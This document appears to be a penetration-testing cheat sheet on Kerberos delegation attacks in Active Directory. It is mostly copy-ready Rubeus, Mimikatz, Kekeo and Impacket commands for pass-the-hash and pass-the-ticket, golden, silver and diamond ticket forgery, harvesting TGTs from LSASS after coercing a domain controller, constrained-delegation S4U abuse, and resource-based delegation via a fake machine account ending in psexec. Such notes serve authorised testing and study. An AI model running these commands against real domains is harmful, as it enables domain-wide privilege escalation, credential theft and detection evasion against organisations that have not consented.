# 07 — Kerberos & Delegation


> [!IMPORTANT]
> Kerberos delegation allows a service to impersonate a user when accessing downstream services. Misconfigured delegation settings (Unconstrained, Constrained, or Resource-Based Constrained Delegation) are primary targets for domain privilege escalation.

---

## Overpass-the-Hash (OPTH) & Pass-the-Ticket (PTT)

### Rubeus TGT Request & PTT
```cmd
# Standard TGT Request & Pass-the-Ticket
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /ptt

# Create NetOnly process for OPSEC / session safety
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Mimikatz OPTH
```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
```

---

## Golden Ticket Creation

Golden Tickets forge a TGT signed with the `krbtgt` password key.

### Rubeus
```cmd
Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
```

### Mimikatz
```text
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /ptt
```

### Impacket — ticketer
```bash
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC> -k -no-pass
```

---

## Silver Ticket Forgery

Forges a TGS for a specific Service Principal Name (SPN) using the service account's key.

### Rubeus
```cmd
Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
```

> [!WARNING]
> **WMI Silver Ticket:** To execute commands via WMI, tickets for **BOTH** `HOST` and `RPCSS` must be generated.

```cmd
Rubeus.exe silver /service:host/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
Rubeus.exe silver /service:rpcss/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /user:Administrator /domain:<DOMAIN> /ptt
```

---

## Diamond Ticket

Diamond Tickets request a valid TGT from the KDC first, then modify its PAC in memory (adding Domain Admin SIDs) and recalculate signatures using the `krbtgt` key. This bypasses TGT request anomaly detections since a legitimate TGT request event was logged by the DC.

### Requirements
- Target Domain SID (`Get-Domain`)
- `krbtgt` account AES256 key (`DCSync`)
- Valid account credentials (username/password or hash) to request initial TGT

### Rubeus
```cmd
Rubeus.exe diamond /user:<USER> /password:'<PASSWORD>' /enctype:aes256 /ticketuser:Administrator /ticketid:500 /groups:512,513,518,519,520 /krbkey:<KRBTGT_AES256> /ptt
```

---

## Unconstrained Delegation (UD)

When a user authenticates to a service with Unconstrained Delegation enabled, the DC includes a copy of the user's TGT inside the service ticket. The service extracts the TGT from LSASS and can impersonate the user anywhere in the domain.

### Enumeration
```powershell
# PowerView: Find computers/users with Unconstrained Delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
```

### Attack Workflow
1. Compromise host with Unconstrained Delegation enabled.
2. Coerce target privileged user (or Domain Controller via Printer Bug / PetitPotam) to authenticate to the UD host.
3. Monitor / Harvest incoming TGTs from memory.

### TGT Extraction & Reuse (Rubeus / Mimikatz)
```cmd
# Monitor for incoming TGTs (Rubeus harvest mode)
Rubeus.exe monitor /interval:5 /targetuser:DC01$

# Dump TGTs from LSASS memory
Rubeus.exe dump /service:krbtgt

# Pass-the-Ticket with harvested TGT
Rubeus.exe ptt /ticket:<BASE64_OR_KIRBI_FILE>
```

```text
# Mimikatz TGT dump
sekurlsa::tickets /export
kerberos::ptt <TICKET_FILE.kirbi>
```

---

## Constrained Delegation (CD & S4U)

Constrained delegation uses **S4U2self** (requests a service ticket to self on behalf of any user) and **S4U2proxy** (uses that ticket to request a service ticket to the allowed downstream service).

### Enumerate
```powershell
Get-NetUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### Rubeus S4U Execution
```cmd
Rubeus.exe s4u /user:<DELEGATED_USER> /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### Kekeo + Mimikatz (Legacy)
```text
# Step 1: Ask TGT for delegated service account
kekeo # tgt::ask /user:<DELEGATED_USER> /domain:<DOMAIN> /password:<PASSWORD>

# Step 2: S4U TGS impersonating Domain Admin
kekeo # tgs::s4u /tgt:<TGT_FILE> /user:Administrator /service:cifs/<TARGET_FQDN>

# Step 3: Pass-the-Ticket
mimikatz # kerberos::ptt <TGS_TICKET_FILE>
```

---

## Resource-Based Constrained Delegation (RBCD)

If an attacker holds `GenericWrite` or `GenericAll` over a computer object, they can configure RBCD.

```powershell
# Step 1: Create a fake computer account (if machine account quota permits)
New-MachineAccount -MachineAccount 'FakeMachine$' -Password 'P@ss123!'

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'= <FAKE_MACHINE_SID_BYTES>}

# Step 3: Execute Rubeus S4U impersonating Domain Admin
Rubeus.exe s4u /user:FakeMachine$ /password:'P@ss123!' /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER> /ptt
```

### Impacket RBCD
```bash
# Configure RBCD
impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET_COMPUTER>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write

# S4U to get ticket
impacket-getST <DOMAIN>/FakeMachine$:'P@ss123!' -spn cifs/<TARGET_COMPUTER> -impersonate Administrator -dc-ip <DC_IP>
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<TARGET_COMPUTER> -k -no-pass
```
